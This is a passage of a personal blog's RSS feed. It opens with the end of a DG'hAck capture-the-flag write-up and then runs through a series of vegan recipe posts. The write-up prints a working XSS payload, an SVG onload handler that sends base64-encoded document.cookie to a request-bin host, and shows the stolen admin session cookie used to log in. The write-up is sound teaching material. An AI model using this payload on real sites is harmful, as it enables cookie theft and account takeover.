&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&amp;lt;&lt;span style="color:#f92672">svg&lt;/span> &lt;span style="color:#a6e22e">onload&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;document.body.innerHTML=document.body.innerHTML.concat(&amp;#39;&amp;lt;img src=\&amp;#39;https://eni7j9jobszxl.x.pipedream.net/&amp;#39;.concat(btoa(document.cookie)).concat(&amp;#39;\&amp;#39; /&amp;gt;&amp;#39;))&amp;#34;&lt;/span> /&amp;gt;
&lt;/code>&lt;/pre>&lt;/div>&lt;p>After a few seconds, we get a request on our &lt;a href="https://requestbin.com/">request bin&lt;/a>, which when decoded gives us the admin cookie :&lt;/p>
&lt;pre>&lt;code>session=.eJwlTstqwzAQ_BWhcyh67UryV_RegllJu7GpGxfLOYX8exV6GubBzDz1LBv1hbuevp5anQP0D_dON9YX_bkxdVbbflPrXZ27olqHqc5l7ep3ZD709XW9jJKD-6Kn83jwYGvTk84VfCkhQ7NoI7GLVhJF8hhNDcEEtFnQCOWYoIENURoKtoQ1coiGjA8sAi65VFMBahElo1gStozZZxYKxgGERpliDNYTChQoBkuDcX9-dD7-39hBaz9kPvdvvg-hgpTkjBPyb_RUGZhqhOxbDqW9h5EI9OsP9hJWpw.X7XZVw.vQUecnJN2gaDUDDYuPeB5LNZbbg
&lt;/code>&lt;/pre>&lt;p>Logging in using that cookie reveals this todo-list :&lt;/p>
&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/internal-support-1-todo.png">&lt;img src="https://nicolasb.fr/assets/dghack/internal-support-1-todo.png" alt="The admin&amp;rsquo;s todo list">&lt;/a>&lt;/p>
&lt;p>Which contains the flag: &lt;code>NoUserValidationIsADangerousPractice&lt;/code>.&lt;/p>
&lt;hr>
&lt;p>&lt;a href="https://nicolasb.fr/tags/dghack">View all of the DG&amp;rsquo;hAck articles&lt;/a>.&lt;/p></content></item><item><title>Madeleines</title><link>https://nicolasb.fr/recipes/2020/09/08/madeleines/</link><pubDate>Tue, 08 Sep 2020 20:49:44 +0200</pubDate><guid>https://nicolasb.fr/recipes/2020/09/08/madeleines/</guid><description>Recipe Source: Madeleines sans oeufs, sans lait {vegan} - Perle en sucre
This took about 10 minutes (before waiting) and 40min (after waiting, using a 9x mold). It&amp;rsquo;s enough for 18 smallish madeleines, and is really easy to make.
Ingredients 150g flour 100g sugar 4g baking powder 2 pinches of salt 110ml plant milk 70ml peanut oil 1 vanilla bean or a teaspoon of vanilla powder A few drops of bitter almond aroma And if you want to wrap the bottom of the madeleines with a chocolate shell, count one square of chocolate per madeleine.</description><content>&lt;h2 id="recipe">Recipe&lt;/h2>
&lt;p>Source: &lt;a href="https://perleensucre.com/madeleines-sans-oeufs-sans-lait-vegan/">Madeleines sans oeufs, sans lait {vegan} - Perle en sucre&lt;/a>&lt;/p>
&lt;p>This took about 10 minutes (before waiting) and 40min (after waiting, using a 9x mold). It&amp;rsquo;s enough for 18 smallish madeleines, and is really easy to make.&lt;/p>
&lt;h3 id="ingredients">Ingredients&lt;/h3>
&lt;ul>
&lt;li>150g flour&lt;/li>
&lt;li>100g sugar&lt;/li>
&lt;li>4g baking powder&lt;/li>
&lt;li>2 pinches of salt&lt;/li>
&lt;li>110ml plant milk&lt;/li>
&lt;li>70ml peanut oil&lt;/li>
&lt;li>1 vanilla bean or a teaspoon of vanilla powder&lt;/li>
&lt;li>A few drops of bitter almond aroma&lt;/li>
&lt;/ul>
&lt;p>And if you want to wrap the bottom of the madeleines with a chocolate shell, count one square of chocolate per madeleine.&lt;/p>
&lt;h3 id="steps">Steps&lt;/h3>
&lt;ul>
&lt;li>Mix every ingredient (except the chocolate) in a large bowl, until the mixture is smooth.&lt;/li>
&lt;li>Wrap the bowl in plastic and let it sit for at least 2 hours, ideally the whole night.&lt;/li>
&lt;li>Fill the molds at 3/4.&lt;/li>
&lt;li>Bake for 4 minutes at 250Â°C (I used 220Â°C because my oven doesn&amp;rsquo;t go that high), and then from 4 to 10 minutes at 200Â°C.&lt;/li>
&lt;li>Put the madeleines in an airtight box while they cool.&lt;/li>
&lt;/ul>
&lt;p>If you want to wrap them with a chocolate shell, wait until they&amp;rsquo;re cool, melt the chocolate, put the equivalent of 1 square in each hole of the mold, and cast the madeleines in them.&lt;/p>
&lt;h2 id="results">Results&lt;/h2>
&lt;p>This is delicious, but be careful, you have to cook them enough or they&amp;rsquo;ll stick to the mold. I baked them for 12 minutes and it was perfect.&lt;/p>
&lt;p>I&amp;rsquo;d give them a 5/5, because they&amp;rsquo;re so fast to make.&lt;/p></content></item><item><title>Chocolate Salted Caramel Tart</title><link>https://nicolasb.fr/recipes/2020/06/30/chocolate-salted-caramel-tart/</link><pubDate>Tue, 30 Jun 2020 17:25:27 +0200</pubDate><guid>https://nicolasb.fr/recipes/2020/06/30/chocolate-salted-caramel-tart/</guid><description>Recipe Source: 5 INGREDIENT CHOCOLATE SALTED CARAMEL TART | THE BEST VEGAN DESSERT
This took about 2 hours to make. It&amp;rsquo;s enough for a lot of people, and is easy to make.
Ingredients 250g cashew nuts 450g dates 120g + 6 tablespoons coconut oil 150g peanut butter (smooth if possible, mine wasn&amp;rsquo;t as smooth as in the original recipe), or almond butter 300g chocolate 6-10 tablespoons water Steps Blend the cashews in a mixer/food processor until it becomes as thin as flour.</description><content>
&lt;a href="https://nicolasb.fr/recipes/2020/06/30/chocolate-salted-caramel-tart/IMG_20200630_161205.jpg">
&lt;img src="https://nicolasb.fr/recipes/2020/06/30/chocolate-salted-caramel-tart/IMG_20200630_161205_hu17574274793e5d416d4ab64e776339f9_3916550_1280x960_fit_q75_lanczos.jpg" style="width: 100%" />
&lt;/a>
&lt;h2 id="recipe">Recipe&lt;/h2>
&lt;p>Source: &lt;a href="https://www.youtube.com/watch?v=d2APMIdmqP0">5 INGREDIENT CHOCOLATE SALTED CARAMEL TART | THE BEST VEGAN DESSERT&lt;/a>&lt;/p>
&lt;p>This took about 2 hours to make. It&amp;rsquo;s enough for a lot of people, and is easy to make.&lt;/p>
&lt;h3 id="ingredients">Ingredients&lt;/h3>
&lt;ul>
&lt;li>250g cashew nuts&lt;/li>
&lt;li>450g dates&lt;/li>
&lt;li>120g + 6 tablespoons coconut oil&lt;/li>
&lt;li>150g peanut butter (smooth if possible, mine wasn&amp;rsquo;t as smooth as in the original recipe), or almond butter&lt;/li>
&lt;li>300g chocolate&lt;/li>
&lt;li>6-10 tablespoons water&lt;/li>
&lt;/ul>
&lt;h3 id="steps">Steps&lt;/h3>
&lt;ul>
&lt;li>Blend the cashews in a mixer/food processor until it becomes as thin as flour. Add in 150g of dates and 2 tablespoons of coconut oil and mix again until it all comes together.&lt;/li>
&lt;li>Pour the mixture in a 20cm cake tin, using a cooking sheet at least on the bottom. I added 4 little strips on the sides (still attached to the bottom face), to be able to pull out the tart later on.&lt;/li>
&lt;li>Compact the mixture, you can use a cooking sheet to avoid it sticking to your spoon/knife.&lt;/li>
&lt;li>Blend the rest of the dates (300g), the peanut butter, 120g of coconut oil and the water. You don&amp;rsquo;t have to wash the mixer/food processor. This should take quite a long time (around 10 minutes for me). It should have a proper caramel texture ; if it doesn&amp;rsquo;t then mix again (or add more water if it&amp;rsquo;s not mixing).&lt;/li>
&lt;li>Spread the new mixture on top of the old one, you can use the same cooking sheet &amp;amp; spoon to make it smooth.&lt;/li>
&lt;li>Melt the chocolate and 4 tablespoons of coconut oil by making a bain-marie.&lt;/li>
&lt;li>Pour the chocolate in the cake tin.&lt;/li>
&lt;li>Refrigerate for at least an hour.&lt;/li>
&lt;/ul>
&lt;h2 id="results">Results&lt;/h2>
&lt;p>This is absolutely delicious, but if you eat too much of it you&amp;rsquo;ll get sick. It&amp;rsquo;s &lt;strong>really&lt;/strong> heavy, and best consumed in small doses.&lt;/p>
&lt;p>Overall, I&amp;rsquo;d give it a 5/5.&lt;/p></content></item><item><title>Vegetable Dumplings</title><link>https://nicolasb.fr/recipes/2020/06/29/vegetable-dumplings/</link><pubDate>Mon, 29 Jun 2020 17:24:23 +0200</pubDate><guid>https://nicolasb.fr/recipes/2020/06/29/vegetable-dumplings/</guid><description>Recipe Source: Vegetable Dumplings (Vegan Gyoza / Potstickers) - Bianca Zapatka
This took about 2 hours to make. It&amp;rsquo;s enough for 4 people, and is easy to make, except for the original shape which I didn&amp;rsquo;t replicate.
I&amp;rsquo;m not writing the recipe here, as I&amp;rsquo;m publishing this page more than a month after baking this.
Results I&amp;rsquo;d give those a 4/5. They&amp;rsquo;re really good, but long to make for what you get, just like the ravioli I made yesterday; also the original shape, which is way better looking, is really hard to replicate.</description><content>
&lt;h2 id="recipe">Recipe&lt;/h2>
&lt;p>Source: &lt;a href="https://biancazapatka.com/en/vegetable-dumplings-vegan-gyoza/#wprm-recipe-container-15016">Vegetable Dumplings (Vegan Gyoza / Potstickers) - Bianca Zapatka&lt;/a>&lt;/p>
&lt;p>This took about 2 hours to make. It&amp;rsquo;s enough for 4 people, and is easy to make, except for the original shape which I didn&amp;rsquo;t replicate.&lt;/p>
&lt;p>&lt;strong>I&amp;rsquo;m not writing the recipe here, as I&amp;rsquo;m publishing this page more than a month after baking this.&lt;/strong>&lt;/p>
&lt;h2 id="results">Results&lt;/h2>
&lt;p>I&amp;rsquo;d give those a 4/5. They&amp;rsquo;re really good, but long to make for what you get, just like the ravioli I made yesterday; also the original shape, which is way better looking, is really hard to replicate.&lt;/p></content></item><item><title>Ravioli</title><link>https://nicolasb.fr/recipes/2020/06/28/ravioli/</link><pubDate>Sun, 28 Jun 2020 17:23:55 +0200</pubDate><guid>https://nicolasb.fr/recipes/2020/06/28/ravioli/</guid><description>Recipe Source: Homemade Vegan Ravioli with Pesto Cashew Cheese Filling | Sensible Plate
This took more than 2 hours to make. It&amp;rsquo;s enough for 4-5 people, and is easy to make.
I&amp;rsquo;m not writing the recipe here, as I&amp;rsquo;m creating this page more than a month after baking this.
Results I&amp;rsquo;d give those a 4.25/5. They&amp;rsquo;re good, but long to make for what you get. I&amp;rsquo;d love to try different fillings though!</description><content>
&lt;h2 id="recipe">Recipe&lt;/h2>
&lt;p>Source: &lt;a href="https://www.youtube.com/watch?v=-I3Sk5tK-wM">Homemade Vegan Ravioli with Pesto Cashew Cheese Filling | Sensible Plate&lt;/a>&lt;/p>
&lt;p>This took more than 2 hours to make. It&amp;rsquo;s enough for 4-5 people, and is easy to make.&lt;/p>
&lt;p>&lt;strong>I&amp;rsquo;m not writing the recipe here, as I&amp;rsquo;m creating this page more than a month after baking this.&lt;/strong>&lt;/p>
&lt;h2 id="results">Results&lt;/h2>
&lt;p>I&amp;rsquo;d give those a 4.25/5. They&amp;rsquo;re good, but long to make for what you get. I&amp;rsquo;d love to try different fillings though!&lt;/p></content></item><item><title>Avocado Tofu Pepper Sandwich</title><link>https://nicolasb.fr/recipes/2020/06/27/avocado-tofu-pepper-sandwich/</link><pubDate>Sat, 27 Jun 2020 10:21:40 +0200</pubDate><guid>https://nicolasb.fr/recipes/2020/06/27/avocado-tofu-pepper-sandwich/</guid><description>Recipe Source: Baked Tofu Sandwich with Roasted Red Pepper - From the comfort of my bowl
This took about 45min to make. It&amp;rsquo;s enough for 4 people, and is really easy to make.
I&amp;rsquo;m not writing the recipe here, as I&amp;rsquo;m creating this page more than a month after baking this.
Results This is a perfectly fine sandwich, and as such I&amp;rsquo;ll give it a 4.5/5. The catch is that it&amp;rsquo;ll only be as good as the bread you use.</description><content>
&lt;a href="https://nicolasb.fr/recipes/2020/06/27/avocado-tofu-pepper-sandwich/IMG_20200627_193606.jpg">
&lt;img src="https://nicolasb.fr/recipes/2020/06/27/avocado-tofu-pepper-sandwich/IMG_20200627_193606_hua77ee8afaa4a200b25c5d94f22167428_802682_1280x960_fit_q75_lanczos.jpg" style="width: 100%" />
&lt;/a>
&lt;h2 id="recipe">Recipe&lt;/h2>
&lt;p>Source: &lt;a href="https://www.fromthecomfortofmybowl.com/baked-tofu-sandwich-roasted-red-pepper/">Baked Tofu Sandwich with Roasted Red Pepper - From the comfort of my bowl&lt;/a>&lt;/p>
&lt;p>This took about 45min to make. It&amp;rsquo;s enough for 4 people, and is really easy to make.&lt;/p>
&lt;p>&lt;strong>I&amp;rsquo;m not writing the recipe here, as I&amp;rsquo;m creating this page more than a month after baking this.&lt;/strong>&lt;/p>
&lt;h2 id="results">Results&lt;/h2>
&lt;p>This is a perfectly fine sandwich, and as such I&amp;rsquo;ll give it a 4.5/5. The catch is that it&amp;rsquo;ll only be as good as the bread you use.&lt;/p></content></item><item><title>Lemon Pasta</title><link>https://nicolasb.fr/recipes/2020/06/26/lemon-pasta/</link><pubDate>Fri, 26 Jun 2020 10:27:09 +0200</pubDate><guid>https://nicolasb.fr/recipes/2020/06/26/lemon-pasta/</guid><description>Recipe Source: Unknown (can&amp;rsquo;t find the link anymore)
This took about 45min to make. It&amp;rsquo;s enough for 4-5 people, and is really easy to make.
I&amp;rsquo;m not writing the recipe here, as I&amp;rsquo;m creating this page more than a month after baking this.
Results I&amp;rsquo;m not too sure about this one. The taste of lemon felt weird, like something was missing. I didn&amp;rsquo;t hate it, but didn&amp;rsquo;t really enjoy it either.</description><content>
&lt;h2 id="recipe">Recipe&lt;/h2>
&lt;p>Source: Unknown (can&amp;rsquo;t find the link anymore)&lt;/p>
&lt;p>This took about 45min to make. It&amp;rsquo;s enough for 4-5 people, and is really easy to make.&lt;/p>
&lt;p>&lt;strong>I&amp;rsquo;m not writing the recipe here, as I&amp;rsquo;m creating this page more than a month after baking this.&lt;/strong>&lt;/p>
&lt;h2 id="results">Results&lt;/h2>
&lt;p>I&amp;rsquo;m not too sure about this one. The taste of lemon felt weird, like something was missing. I didn&amp;rsquo;t hate it, but didn&amp;rsquo;t really enjoy it either. Overall, I&amp;rsquo;d give it a 3.5/5.&lt;/p></content></item><item><title>Lemon Pie</title><link>https://nicolasb.fr/recipes/2020/06/25/lemon-pie/</link><pubDate>Thu, 25 Jun 2020 14:17:15 +0200</pubDate><guid>https://nicolasb.fr/recipes/2020/06/25/lemon-pie/</guid><description>Recipe Source: TARTE AU CITRON MERINGUÃ‰E | VEGAN - Lloyd Lang
This took about 2 hours to make. It&amp;rsquo;s enough for more than 5 people, and is easy to make.
I&amp;rsquo;m not writing the recipe here, as I&amp;rsquo;m creating this page more than a month after baking this.
Results One of the best desserts I&amp;rsquo;ve done so far, I&amp;rsquo;d give it a 4.75/5. I love the effect of the lemon&amp;rsquo;s sourness on the taste.</description><content>
&lt;a href="https://nicolasb.fr/recipes/2020/06/25/lemon-pie/IMG_20200625_200740.jpg">
&lt;img src="https://nicolasb.fr/recipes/2020/06/25/lemon-pie/IMG_20200625_200740_hu35c3a5bb6b933658517908ad846f60bf_1405052_1280x960_fit_q75_lanczos.jpg" style="width: 100%" />
&lt;/a>
&lt;h2 id="recipe">Recipe&lt;/h2>
&lt;p>Source: &lt;a href="https://www.youtube.com/watch?v=EaStrywOa3k">TARTE AU CITRON MERINGUÃ‰E | VEGAN - Lloyd Lang&lt;/a>&lt;/p>
&lt;p>This took about 2 hours to make. It&amp;rsquo;s enough for more than 5 people, and is easy to make.&lt;/p>
&lt;p>&lt;strong>I&amp;rsquo;m not writing the recipe here, as I&amp;rsquo;m creating this page more than a month after baking this.&lt;/strong>&lt;/p>
&lt;h2 id="results">Results&lt;/h2>
&lt;p>One of the best desserts I&amp;rsquo;ve done so far, I&amp;rsquo;d give it a 4.75/5. I love the effect of the lemon&amp;rsquo;s sourness on the taste.&lt;/p></content></item><item><title>Margherita Pizza</title><link>https://nicolasb.fr/recipes/2020/06/24/margherita-pizza/</link><pubDate>Wed, 24 Jun 2020 14:22:21 +0200</pubDate><guid>https://nicolasb.fr/recipes/2020/06/24/margherita-pizza/</guid><description>Recipe Source: PIZZA MARGHERITA VEGAN | Recette PÃ¢te &amp;amp; Fromage Filant - Lloyd Lang
This took about an hour to make. It&amp;rsquo;s enough for more than 5 people (for a slice each), and is easy to make.
I&amp;rsquo;m not writing the recipe here, as I&amp;rsquo;m creating this page more than a month after baking this.
Results This wasn&amp;rsquo;t too bad - I think I&amp;rsquo;m getting pretty okay at baking pizzas!</description><content>
&lt;a href="https://nicolasb.fr/recipes/2020/06/24/margherita-pizza/IMG_2359.jpg">
&lt;img src="https://nicolasb.fr/recipes/2020/06/24/margherita-pizza/IMG_2359_hu3b275cf556280f5a5ced1e3ad4f597b8_5618525_1280x960_fit_q75_lanczos.jpg" style="width: 100%" />
&lt;/a>
&lt;a href="https://nicolasb.fr/recipes/2020/06/24/margherita-pizza/IMG_2363.jpg">
&lt;img src="https://nicolasb.fr/recipes/2020/06/24/margherita-pizza/IMG_2363_hu9e4b67f279d5b15fe593b136dfe6dac2_6938236_1280x960_fit_q75_lanczos.jpg" style="width: 100%" />
&lt;/a>
&lt;h2 id="recipe">Recipe&lt;/h2>
&lt;p>Source: &lt;a href="https://www.youtube.com/watch?v=076IaEg90YY">PIZZA MARGHERITA VEGAN | Recette PÃ¢te &amp;amp; Fromage Filant - Lloyd Lang&lt;/a>&lt;/p>
&lt;p>This took about an hour to make. It&amp;rsquo;s enough for more than 5 people (for a slice each), and is easy to make.&lt;/p>
&lt;p>&lt;strong>I&amp;rsquo;m not writing the recipe here, as I&amp;rsquo;m creating this page more than a month after baking this.&lt;/strong>&lt;/p>
&lt;h2 id="results">Results&lt;/h2>
&lt;p>This wasn&amp;rsquo;t too bad - I think I&amp;rsquo;m getting pretty okay at baking pizzas!&lt;/p>
&lt;p>The fake cheese really added to the taste - I&amp;rsquo;ll steal that part for other pizzas.&lt;/p>
&lt;p>Overall, I&amp;rsquo;d give those pizzas a 4.5/5 - they could be more aesthetically pleasing.&lt;/p></content></item><item><title>Chocolate Macaroons</title><link>https://nicolasb.fr/recipes/2020/06/23/chocolate-macaroons/</link><pubDate>Tue, 23 Jun 2020 14:23:09 +0200</pubDate><guid>https://nicolasb.fr/recipes/2020/06/23/chocolate-macaroons/</guid><description>Recipe Source: Macarons au chocolat Vegan Ã  base dâ€™aquafaba - DÃ©liacious
This took about an hour and a half to make. It&amp;rsquo;s enough for 4+ people, and is really hard to make (at least, to make them look good).
I&amp;rsquo;m not writing the recipe here, as I&amp;rsquo;m creating this page more than a month after baking this.
Results I didn&amp;rsquo;t expect it to be that hard to get beautiful macaroons.</description><content>
&lt;h2 id="recipe">Recipe&lt;/h2>
&lt;p>Source: &lt;a href="https://deliacious.com/2018/03/macarons-chocolat-vegan-aquafaba.html">Macarons au chocolat Vegan Ã  base dâ€™aquafaba - DÃ©liacious&lt;/a>&lt;/p>
&lt;p>This took about an hour and a half to make. It&amp;rsquo;s enough for 4+ people, and is really hard to make (at least, to make them look good).&lt;/p>
&lt;p>&lt;strong>I&amp;rsquo;m not writing the recipe here, as I&amp;rsquo;m creating this page more than a month after baking this.&lt;/strong>&lt;/p>
&lt;h2 id="results">Results&lt;/h2>
&lt;p>I didn&amp;rsquo;t expect it to be that hard to get beautiful macaroons. You have to get the baking time exactly right - which I didn&amp;rsquo;t. I&amp;rsquo;ll have to try again sometime.&lt;/p>
&lt;p>Still, even if they were not pretty to look at, they were pretty good! Overall, I&amp;rsquo;d give them a 4.25/5.&lt;/p></content></item><item><title>Workout Smoothie</title><link>https://nicolasb.fr/recipes/2020/06/22/workout-smoothie/</link><pubDate>Mon, 22 Jun 2020 14:53:13 +0200</pubDate><guid>https://nicolasb.fr/recipes/2020/06/22/workout-smoothie/</guid><description>Recipe Source: 3 Post-Workout Smoothies - simply quinoa
This took about 10 minutes to make. It&amp;rsquo;s enough for 4 people, and is really easy to make (you just have to blend the ingredients).
I&amp;rsquo;m not writing the recipe here, as I&amp;rsquo;m creating this page more than a month after baking this.
Results After my first time trying this recipe, I took some liberties with the ingredients, adding what I had in the fridge with pretty good results.</description><content>
&lt;h2 id="recipe">Recipe&lt;/h2>
&lt;p>Source: &lt;a href="https://www.simplyquinoa.com/3-post-workout-smoothies/">3 Post-Workout Smoothies - simply quinoa&lt;/a>&lt;/p>
&lt;p>This took about 10 minutes to make. It&amp;rsquo;s enough for 4 people, and is really easy to make (you just have to blend the ingredients).&lt;/p>
&lt;p>&lt;strong>I&amp;rsquo;m not writing the recipe here, as I&amp;rsquo;m creating this page more than a month after baking this.&lt;/strong>&lt;/p>
&lt;h2 id="results">Results&lt;/h2>
&lt;p>After my first time trying this recipe, I took some liberties with the ingredients, adding what I had in the fridge with pretty good results.&lt;/p>
&lt;p>Those can be really good, and I craved them after coming back from my workout sessions. I&amp;rsquo;d give them a 4.5/5 (I preferred the second recipe).&lt;/p></content></item><item><title>Meringue</title><link>https://nicolasb.fr/recipes/2020/06/21/meringue/</link><pubDate>Sun, 21 Jun 2020 14:28:15 +0200</pubDate><guid>https://nicolasb.fr/recipes/2020/06/21/meringue/</guid><description>Recipe Source: VEGAN MERINGUE RECIPE - The Happy Pear
This took about 30 minutes to make (plus 2-3 hours for baking). It&amp;rsquo;s enough for more than 5 people, but is kind of hard to make.
I&amp;rsquo;m not writing the recipe here, as I&amp;rsquo;m creating this page more than a month after baking this.
Results Those are easy to mess up. For example, I almost made a plate of sticky meringues by cooking them for only 2 hours.</description><content>
&lt;h2 id="recipe">Recipe&lt;/h2>
&lt;p>Source: &lt;a href="https://www.youtube.com/watch?v=mkRylRw0QfI">VEGAN MERINGUE RECIPE - The Happy Pear&lt;/a>&lt;/p>
&lt;p>This took about 30 minutes to make (plus 2-3 hours for baking). It&amp;rsquo;s enough for more than 5 people, but is kind of hard to make.&lt;/p>
&lt;p>&lt;strong>I&amp;rsquo;m not writing the recipe here, as I&amp;rsquo;m creating this page more than a month after baking this.&lt;/strong>&lt;/p>
&lt;h2 id="results">Results&lt;/h2>
&lt;p>Those are easy to mess up. For example, I almost made a plate of sticky meringues by cooking them for only 2 hours.&lt;/p>
&lt;p>However, the finished product is really good, and I&amp;rsquo;d give these meringues a 4.75/5.&lt;/p></content></item><item><title>Vegan Burger</title><link>https://nicolasb.fr/recipes/2020/06/20/vegan-burger/</link><pubDate>Sat, 20 Jun 2020 13:46:44 +0200</pubDate><guid>https://nicolasb.fr/recipes/2020/06/20/vegan-burger/</guid><description>Recipe Source: WHOLE FOOD VEGAN BURGER | NUT FREE, NO TVP &amp;amp; NO BEANS - The Happy Pear
This took about 2 hours to make. It&amp;rsquo;s enough for 4 people, and is easy to make.
I&amp;rsquo;m not writing the recipe here, as I&amp;rsquo;m creating this page more than a month after baking this.
Results Those were really good, with the &amp;ldquo;steaks&amp;rdquo; being the best part of the burgers. I was surprised by how well they stayed together, I didn&amp;rsquo;t have any issues with this.</description><content>
&lt;a href="https://nicolasb.fr/recipes/2020/06/20/vegan-burger/IMG_20200620_203249.jpg">
&lt;img src="https://nicolasb.fr/recipes/2020/06/20/vegan-burger/IMG_20200620_203249_hu5880456b95da240c2484378042cd9500_373692_1280x960_fit_q75_lanczos.jpg" style="width: 100%" />
&lt;/a>
&lt;h2 id="recipe">Recipe&lt;/h2>
&lt;p>Source: &lt;a href="https://www.youtube.com/watch?v=Z0oFBEnVgQA">WHOLE FOOD VEGAN BURGER | NUT FREE, NO TVP &amp;amp; NO BEANS - The Happy Pear&lt;/a>&lt;/p>
&lt;p>This took about 2 hours to make. It&amp;rsquo;s enough for 4 people, and is easy to make.&lt;/p>
&lt;p>&lt;strong>I&amp;rsquo;m not writing the recipe here, as I&amp;rsquo;m creating this page more than a month after baking this.&lt;/strong>&lt;/p>
&lt;h2 id="results">Results&lt;/h2>
&lt;p>Those were really good, with the &amp;ldquo;steaks&amp;rdquo; being the best part of the burgers. I was surprised by how well they stayed together, I didn&amp;rsquo;t have any issues with this.&lt;/p>
&lt;p>Overall, I&amp;rsquo;d give them a 4.75/5.&lt;/p></content></item><item><title>Vegan Mozarella</title><link>https://nicolasb.fr/recipes/2020/06/19/vegan-mozarella/</link><pubDate>Fri, 19 Jun 2020 13:50:16 +0200</pubDate><guid>https://nicolasb.fr/recipes/2020/06/19/vegan-mozarella/</guid><description>Recipe Source: Vegan Mozzarella | Vegan Cheese - The Happy Pear
This took about 30 minutes to prepare, plus a little bit of time for each toast. It&amp;rsquo;s enough for 5+ people, depending on how many toasts each person eats, and is really easy to make.
I&amp;rsquo;m not writing the recipe here, as I&amp;rsquo;m creating this page more than a month after baking this.
Results Those were delicious, I ate too many toasts and didn&amp;rsquo;t even regret it.</description><content>
&lt;a href="https://nicolasb.fr/recipes/2020/06/19/vegan-mozarella/IMG_20200619_210343.jpg">
&lt;img src="https://nicolasb.fr/recipes/2020/06/19/vegan-mozarella/IMG_20200619_210343_hu930b2d04adbd05aae41be9043e8077c1_1845351_1280x960_fit_q75_lanczos.jpg" style="width: 100%" />
&lt;/a>
&lt;h2 id="recipe">Recipe&lt;/h2>
&lt;p>Source: &lt;a href="https://www.youtube.com/watch?v=fo2K1nSef2Y">Vegan Mozzarella | Vegan Cheese - The Happy Pear&lt;/a>&lt;/p>
&lt;p>This took about 30 minutes to prepare, plus a little bit of time for each toast. It&amp;rsquo;s enough for 5+ people, depending on how many toasts each person eats, and is really easy to make.&lt;/p>
&lt;p>&lt;strong>I&amp;rsquo;m not writing the recipe here, as I&amp;rsquo;m creating this page more than a month after baking this.&lt;/strong>&lt;/p>
&lt;h2 id="results">Results&lt;/h2>
&lt;p>Those were delicious, I ate too many toasts and didn&amp;rsquo;t even regret it. I&amp;rsquo;d give them a 5/5.&lt;/p></content></item><item><title>Vegan Carbonara</title><link>https://nicolasb.fr/recipes/2020/06/18/vegan-carbonara/</link><pubDate>Thu, 18 Jun 2020 13:48:54 +0200</pubDate><guid>https://nicolasb.fr/recipes/2020/06/18/vegan-carbonara/</guid><description>Recipe Source: EPIC VEGAN CARBONARA in 5 MINUTES! | THE HAPPY PEAR - The Happy Pear
This took about 45min to make. It&amp;rsquo;s enough for 4-5 people, and is easy to make.
I&amp;rsquo;m not writing the recipe here, as I&amp;rsquo;m creating this page more than a month after baking this.
Results While the result isn&amp;rsquo;t the most beautiful thing to look at, it&amp;rsquo;s definitely tasty. I particularly liked the shiitake mushrooms, which have a distinct taste.</description><content>
&lt;h2 id="recipe">Recipe&lt;/h2>
&lt;p>Source: &lt;a href="https://www.youtube.com/watch?v=X_qUHFx-jCI">EPIC VEGAN CARBONARA in 5 MINUTES! | THE HAPPY PEAR - The Happy Pear&lt;/a>&lt;/p>
&lt;p>This took about 45min to make. It&amp;rsquo;s enough for 4-5 people, and is easy to make.&lt;/p>
&lt;p>&lt;strong>I&amp;rsquo;m not writing the recipe here, as I&amp;rsquo;m creating this page more than a month after baking this.&lt;/strong>&lt;/p>
&lt;h2 id="results">Results&lt;/h2>
&lt;p>While the result isn&amp;rsquo;t the most beautiful thing to look at, it&amp;rsquo;s definitely tasty. I particularly liked the shiitake mushrooms, which have a distinct taste. I&amp;rsquo;d give this carbonara a 4.75/5.&lt;/p></content></item><item><title>Carrot Cake</title><link>https://nicolasb.fr/recipes/2020/06/17/carrot-cake/</link><pubDate>Wed, 17 Jun 2020 14:30:35 +0200</pubDate><guid>https://nicolasb.fr/recipes/2020/06/17/carrot-cake/</guid><description>Recipe Source: 5 INGREDIENT CARROT CAKE | VEGAN LOCK DOWN DESSERT - The Happy Pear
This took more than 4 hours to make because I only had one mold. It&amp;rsquo;s enough for more than 5 people, and is not too hard to make.
I&amp;rsquo;m not writing the recipe here, as I&amp;rsquo;m creating this page more than a month after baking this.
Results This is really good, I baked it for a birthday and (I think) everyone loved it.</description><content>
&lt;a href="https://nicolasb.fr/recipes/2020/06/17/carrot-cake/IMG_2332.jpg">
&lt;img src="https://nicolasb.fr/recipes/2020/06/17/carrot-cake/IMG_2332_huc11e381df803dc88dbb394b7490089fc_5149235_1280x960_fit_q75_lanczos.jpg" style="width: 100%" />
&lt;/a>
&lt;h2 id="recipe">Recipe&lt;/h2>
&lt;p>Source: &lt;a href="https://www.youtube.com/watch?v=ayV5ChBUKa4&amp;amp;t=0s">5 INGREDIENT CARROT CAKE | VEGAN LOCK DOWN DESSERT - The Happy Pear&lt;/a>&lt;/p>
&lt;p>This took more than 4 hours to make because I only had one mold. It&amp;rsquo;s enough for more than 5 people, and is not too hard to make.&lt;/p>
&lt;p>&lt;strong>I&amp;rsquo;m not writing the recipe here, as I&amp;rsquo;m creating this page more than a month after baking this.&lt;/strong>&lt;/p>
&lt;h2 id="results">Results&lt;/h2>
&lt;p>This is really good, I baked it for a birthday and (I think) everyone loved it. Note that it&amp;rsquo;s really dense, we took around 4 days to finish it.&lt;/p>
&lt;p>I messed up the cream a bit, so it wasn&amp;rsquo;t perfectly white.&lt;/p>
&lt;p>I&amp;rsquo;d give it a perfect score - next time I&amp;rsquo;ll try getting the specific molds that are recommended (two with removable bottoms), which should make the baking time a lot shorter.&lt;/p></content></item><item><title>Ramen</title><link>https://nicolasb.fr/recipes/2020/06/16/ramen/</link><pubDate>Tue, 16 Jun 2020 14:30:12 +0200</pubDate><guid>https://nicolasb.fr/recipes/2020/06/16/ramen/</guid><description>Recipe Source: EASY VEGAN RAMEN | THE HAPPY PEAR #OILFREE - The Happy Pear
This took more than an hour to make. It&amp;rsquo;s enough for 4 people, and is easy to make.
I&amp;rsquo;m not writing the recipe here, as I&amp;rsquo;m creating this page more than a month after baking this.
Results Those are absolutely delicious. Altough I&amp;rsquo;ve not tried a lot of ramens in my life, I could tell this was not bad at all.</description><content>
&lt;a href="https://nicolasb.fr/recipes/2020/06/16/ramen/IMG_20200616_201822.jpg">
